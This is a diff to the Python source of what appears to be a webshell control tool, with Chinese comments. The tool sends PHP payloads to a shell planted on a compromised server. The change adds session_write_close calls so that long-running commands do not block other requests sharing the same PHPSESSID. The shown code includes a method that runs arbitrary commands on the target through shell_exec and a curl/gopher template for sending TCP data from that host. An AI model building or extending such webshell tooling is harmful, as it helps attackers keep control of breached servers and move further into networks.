@@ -237,6 +237,7 @@ if(!is_file(FILEPATH)) {
 """
 )
 
+# 为了防止阻塞其他使用同一个PHPSESSID的操作，关闭session写入
 SEND_BYTES_OVER_TCP_GOPHER_CURL_PHP = compress_phpcode_template(
     """
 function send_tcp($host, $port, $s)
@@ -251,7 +252,7 @@ function send_tcp($host, $port, $s)
     curl_close($ch);
     return $res;
 }
-                                                                
+@session_write_close();
 if(!function_exists("curl_init")) {
     decoder_echo("WRONG_NOT_SUPPORTED");
 }else{
@@ -716,7 +717,11 @@ class PHPWebshell(PHPSessionInterface):
     # --- 以下是Interface的实现，依赖submit函数 ---
 
     async def execute_cmd(self, cmd: str) -> str:
-        return await self.submit(f"decoder_echo(shell_exec({cmd!r}));")
+        # 在执行长时间操作时会导致阻塞其他使用同一个PHPSESSID的操作
+        # 所以需要关闭session来避免阻塞
+        return await self.submit(
+            f"@session_write_close(); decoder_echo(shell_exec({cmd!r}));"
+        )
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         dir_path = dir_path.removesuffix("/") + "/"
